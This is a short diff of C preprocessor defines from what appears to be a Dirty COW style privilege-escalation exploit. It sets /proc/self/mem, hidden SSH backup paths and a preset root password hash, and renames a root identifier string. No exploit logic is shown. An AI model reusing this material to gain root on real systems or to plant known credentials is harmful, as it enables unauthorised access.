@@ -34,7 +34,7 @@
 #define  BAKFILE     "./.ssh_bak"
 #define  TMPBAKFILE  "/tmp/.ssh_bak"
 #define  PSM         "/proc/self/mem"
-#define  ROOTID      "cow:"
+#define  ROOTID      "dirty:"
 #define  SSHDID      "sshd:"
 #define  MAXITER     300
 #define  DEFPWD      "$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/"
